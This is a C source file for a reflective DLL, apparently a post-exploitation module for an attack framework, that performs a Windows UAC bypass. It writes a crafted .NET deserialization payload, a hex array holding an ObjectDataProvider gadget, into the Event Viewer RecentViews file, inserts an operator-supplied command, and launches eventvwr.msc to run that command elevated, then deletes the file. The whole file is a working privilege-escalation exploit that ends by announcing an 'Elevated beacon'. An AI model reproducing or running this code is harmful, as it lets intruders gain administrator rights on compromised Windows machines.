#include <windows.h>
#include <stdio.h>
#include "ReflectiveLoader.h"
#define MAX_SIZE 256


extern HINSTANCE hAppInstance;
HANDLE hfile;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_QUERY_HMODULE:
                    if( lpvReserved != NULL )
                    *(HMODULE *)lpvReserved = hAppInstance;
                    break;
        case DLL_PROCESS_ATTACH:
                   hAppInstance = hinstDLL;
                   if(lpvReserved != NULL){
                    
                       unsigned char rawData[1669] = {
                                    0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00,
                                    0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x4E, 0x53,
                                    0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2C, 0x20,
                                    0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x34, 0x2E, 0x30, 0x2E,
                                    0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65,
                                    0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75,
                                    0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E,
                                    0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33,
                                    0x34, 0x65, 0x30, 0x38, 0x39, 0x05, 0x01, 0x00, 0x00, 0x00, 0x13, 0x53,
                                    0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2E, 0x44,
                                    0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x0A, 0x00, 0x00, 0x00, 0x16, 0x44,
                                    0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x52, 0x65, 0x6D, 0x6F, 0x74,
                                    0x69, 0x6E, 0x67, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x13, 0x44, 0x61,
                                    0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65,
                                    0x74, 0x4E, 0x61, 0x6D, 0x65, 0x11, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65,
                                    0x74, 0x2E, 0x4E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x0E,
                                    0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x50, 0x72, 0x65, 0x66,
                                    0x69, 0x78, 0x15, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x43,
                                    0x61, 0x73, 0x65, 0x53, 0x65, 0x6E, 0x73, 0x69, 0x74, 0x69, 0x76, 0x65,
                                    0x12, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x4C, 0x6F, 0x63,
                                    0x61, 0x6C, 0x65, 0x4C, 0x43, 0x49, 0x44, 0x1A, 0x44, 0x61, 0x74, 0x61,
                                    0x53, 0x65, 0x74, 0x2E, 0x45, 0x6E, 0x66, 0x6F, 0x72, 0x63, 0x65, 0x43,
                                    0x6F, 0x6E, 0x73, 0x74, 0x72, 0x61, 0x69, 0x6E, 0x74, 0x73, 0x1A, 0x44,
                                    0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x45, 0x78, 0x74, 0x65, 0x6E,
                                    0x64, 0x65, 0x64, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65,
                                    0x73, 0x14, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x54, 0x61,
                                    0x62, 0x6C, 0x65, 0x73, 0x2E, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x10, 0x44,
                                    0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x54, 0x61, 0x62, 0x6C, 0x65,
                                    0x73, 0x5F, 0x30, 0x04, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00,
                                    0x07, 0x1F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61, 0x74,
                                    0x61, 0x2E, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74,
                                    0x69, 0x6F, 0x6E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x02, 0x00, 0x00,
                                    0x00, 0x01, 0x08, 0x01, 0x08, 0x02, 0x02, 0x00, 0x00, 0x00, 0x05, 0xFD,
                                    0xFF, 0xFF, 0xFF, 0x1F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44,
                                    0x61, 0x74, 0x61, 0x2E, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A,
                                    0x61, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x01,
                                    0x00, 0x00, 0x00, 0x07, 0x76, 0x61, 0x6C, 0x75, 0x65, 0x5F, 0x5F, 0x00,
                                    0x08, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x04, 0x00,
                                    0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00,
                                    0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x00, 0x00, 0x00,
                                    0x09, 0x05, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x00, 0x00, 0x00, 0x95, 0x03,
                                    0x00, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
                                    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x02, 0x00, 0x00,
                                    0x00, 0x5E, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E,
                                    0x50, 0x6F, 0x77, 0x65, 0x72, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x45,
                                    0x64, 0x69, 0x74, 0x6F, 0x72, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69,
                                    0x6F, 0x6E, 0x3D, 0x33, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x2C, 0x20,
                                    0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74,
                                    0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B,
                                    0x65, 0x79, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x33, 0x31, 0x62, 0x66,
                                    0x33, 0x38, 0x35, 0x36, 0x61, 0x64, 0x33, 0x36, 0x34, 0x65, 0x33, 0x35,
                                    0x05, 0x01, 0x00, 0x00, 0x00, 0x42, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73,
                                    0x6F, 0x66, 0x74, 0x2E, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6C, 0x53, 0x74,
                                    0x75, 0x64, 0x69, 0x6F, 0x2E, 0x54, 0x65, 0x78, 0x74, 0x2E, 0x46, 0x6F,
                                    0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x2E, 0x54, 0x65, 0x78,
                                    0x74, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x52,
                                    0x75, 0x6E, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65, 0x73,
                                    0x01, 0x00, 0x00, 0x00, 0x0F, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F,
                                    0x75, 0x6E, 0x64, 0x42, 0x72, 0x75, 0x73, 0x68, 0x01, 0x02, 0x00, 0x00,
                                    0x00, 0x06, 0x03, 0x00, 0x00, 0x00, 0xB7, 0x05, 0x3C, 0x3F, 0x78, 0x6D,
                                    0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x22, 0x31,
                                    0x2E, 0x30, 0x22, 0x20, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67,
                                    0x3D, 0x22, 0x75, 0x74, 0x66, 0x2D, 0x38, 0x22, 0x3F, 0x3E, 0x0D, 0x0A,
                                    0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50,
                                    0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x4D, 0x65, 0x74, 0x68,
                                    0x6F, 0x64, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x53, 0x74, 0x61, 0x72,
                                    0x74, 0x22, 0x20, 0x49, 0x73, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C,
                                    0x4C, 0x6F, 0x61, 0x64, 0x45, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x64, 0x3D,
                                    0x22, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E,
                                    0x73, 0x3D, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63,
                                    0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73,
                                    0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66,
                                    0x78, 0x2F, 0x32, 0x30, 0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x2F,
                                    0x70, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x61, 0x74, 0x69, 0x6F, 0x6E,
                                    0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x73, 0x64, 0x3D, 0x22,
                                    0x63, 0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63,
                                    0x65, 0x3A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x69, 0x61,
                                    0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x73, 0x3B, 0x61, 0x73, 0x73,
                                    0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3D, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D,
                                    0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x78, 0x3D, 0x22, 0x68,
                                    0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61,
                                    0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E,
                                    0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66, 0x78, 0x2F, 0x32, 0x30,
                                    0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x22, 0x3E, 0x0D, 0x0A, 0x20,
                                    0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61,
                                    0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4F, 0x62, 0x6A,
                                    0x65, 0x63, 0x74, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3E,
                                    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x64, 0x3A, 0x50, 0x72,
                                    0x6F, 0x63, 0x65, 0x73, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
                                    0x20, 0x20, 0x3C, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
                                    0x73, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E,
                                    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73,
                                    0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61,
                                    0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64,
                                    0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x45, 0x6E, 0x63, 0x6F,
                                    0x64, 0x69, 0x6E, 0x67, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C,
                                    0x6C, 0x7D, 0x22, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64,
                                    0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x45, 0x6E, 0x63, 0x6F, 0x64, 0x69,
                                    0x6E, 0x67, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D,
                                    0x22, 0x20, 0x55, 0x73, 0x65, 0x72, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22,
                                    0x22, 0x20, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 0x3D, 0x22,
                                    0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D, 0x22, 0x20, 0x44, 0x6F,
                                    0x6D, 0x61, 0x69, 0x6E, 0x3D, 0x22, 0x22, 0x20, 0x4C, 0x6F, 0x61, 0x64,
                                    0x55, 0x73, 0x65, 0x72, 0x50, 0x72, 0x6F, 0x66, 0x69, 0x6C, 0x65, 0x3D,
                                    0x22, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x22, 0x20, 0x46, 0x69, 0x6C, 0x65,
                                    0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E,
                                    0x64, 0x6F, 0x77, 0x73, 0x5C, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
                                    0x32, 0x5C, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x22, 0x20,
                                    0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F,
                                    0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x2E, 0x53,
                                    0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E, 0x0D, 0x0A, 0x20,
                                    0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63,
                                    0x65, 0x73, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x4F, 0x62,
                                    0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76,
                                    0x69, 0x64, 0x65, 0x72, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49,
                                    0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F,
                                    0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72,
                                    0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x3E, 0x0B, 0x0B
                                };
                
                    
                  
                    
                    
                    char * cmd;
                    cmd = (char *)lpvReserved;
                    cmd = cmd + 0x4;
                    DWORD cmdSize = strlen(cmd);
                    if (cmdSize > MAX_SIZE) {
                        printf("Command must be 256 characters or less");
                        ExitProcess(0);
                    }
                    SHELLEXECUTEINFOA shellinfo = { 0 };
                    shellinfo.cbSize = sizeof(shellinfo);
                    shellinfo.lpFile = "C:\\Windows\\system32\\eventvwr.msc";
                    shellinfo.lpVerb = "open";
                    shellinfo.lpParameters = "/s";
                    shellinfo.nShow = 0;
                    shellinfo.fMask = SEE_MASK_NOCLOSEPROCESS;

                    DWORD status = 0;
                    DWORD dwWrite = 0;
                    DWORD dwSize = 0;
                    DWORD dwRead = 0;
                    BOOL bStatus = FALSE;
                    DWORD pathSize = 0;
                    DWORD directorySize = 0;
                    DWORD newPathSize = 0;
                    char appdata[MAX_SIZE] = "";
                    char appdata2[MAX_SIZE] = "";
                    char appdatadir[MAX_SIZE] = "";
                    DWORD rawSize =0;
                    char directory[] = "\\Microsoft\\Event Viewer";
                    char path[] = "\\Microsoft\\Event Viewer\\RecentViews11";
                    char newpath[] = "\\Microsoft\\Event Viewer\\RecentViews";
                    pathSize = strlen(path);
                    directorySize = strlen(directory);
                    newPathSize = strlen(newpath);
                    dwRead = GetEnvironmentVariableA("LOCALAPPDATA", appdata, MAX_SIZE);
                    if (dwRead <= 0) {
                        printf("GetEnvironmentVariableA Failed with Error %d\n", GetLastError());
                        goto cleanup;
                    }
                    memcpy(appdata2, appdata, dwRead);
                    memcpy(appdatadir, appdata, dwRead);

                    memcpy(appdata + dwRead, path, pathSize + 1);
                    memcpy(appdata2 + dwRead, newpath, newPathSize + 1);
                    
                    hfile = CreateFileA(appdata, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (GetLastError() == 3) {
                        memcpy(appdatadir + dwRead, directory, directorySize + 1);
                        bStatus = CreateDirectoryA(appdatadir, NULL);
                        if (bStatus == 0) {
                            printf("CreateDirectoryA Failed with Error %d\n", GetLastError());
                            goto cleanup;
                        }
                        hfile = CreateFileA(appdata, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                      
                    }
                        if (hfile == INVALID_HANDLE_VALUE) {
                            printf("CreateFile Failed with Error %d\n", GetLastError());
                            goto cleanup;
                        }
                   
                    printf("File Handle was successfully recieved\n");
                    rawSize = sizeof(rawData);
                    unsigned char temp[0x10B] = "";
                    DWORD defoffset1 = 0x7A;
                    DWORD defoffset2 = 0x9C;
                    for (int i = 1; i <= cmdSize; i++) {
                        if (i == 1) {
                        }
                        if (i == 80) {
                            defoffset1++;
                        }
                        *(rawData + 0x1ea) = defoffset1;
                        defoffset1++;
                        *(rawData + 0x2CA) = defoffset2;
                        defoffset2++;

                        if (defoffset2 == 0xFF && i != cmdSize) {
                            i++;
                            defoffset2 = 0x80;
                        }
                        if (i == 115) {
                            *(rawData + 0x1EB) = 0x04;
                        }
                        if (i == 81) {
                            *(rawData + 0x2CB) = 0x06;
                        }
                        if (i == 209) {
                            *(rawData + 0x2CB) = 0x07;
                        }


                    }

                    memcpy(temp, (rawData + 0x50E), 0x77);
                    memset((rawData + 0x50E), 0x00, 0x77);
                    memcpy((rawData + 0x4F2), cmd, strlen(cmd));
                    memcpy((rawData + 0x4F2 + strlen(cmd)), temp, 0x77);
                    WriteFile(hfile, rawData, rawSize + 1, &dwWrite, NULL);
                    if (dwWrite <= 0) {
                        printf("WriteFile Failed with Error %d\n", GetLastError());
                        goto cleanup;
                    }
                    printf("Patch was successfully written\n");

                    CloseHandle(hfile);
                    if (!MoveFileExA(appdata, appdata2, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                        printf("MoveFileExA Failed with %d\n", GetLastError());
                        goto cleanup;
                    }
                   
                   
                    if (!ShellExecuteExA(&shellinfo)) {
                        printf("ShellExecuteExA Failed with %d\n", GetLastError());
                        goto cleanup;
                    }
                    Sleep(900);
                    if (!TerminateProcess(shellinfo.hProcess, 0)) {
                        printf("TerminiateProcess Failed with %d\n", GetLastError());
                        goto cleanup;
                    }
                    if (WaitForSingleObject(shellinfo.hProcess, INFINITE) == WAIT_OBJECT_0) {
                        if (!DeleteFile(appdata2)) {
                            printf("DeleteFile Failed with %d\n", GetLastError());
                            goto cleanup;
                        }
                       
                    }
                    printf("Enjoy your Elevated beacon!\n");
                    
                    goto cleanup;
                cleanup:
                    if (hfile != NULL) {
                        CloseHandle(hfile);
                    }
                    if (shellinfo.hProcess != NULL) {
                        CloseHandle(hfile);
                    }



                    fflush(stdout);
                    ExitProcess(0);
               
                    
                   }

            break;
        case DLL_PROCESS_DETACH:
            // detach from process
            break;

        case DLL_THREAD_ATTACH:
            // attach to thread
            break;

        case DLL_THREAD_DETACH:
            // detach from thread
            break;
    }
    return TRUE; // succesful
}
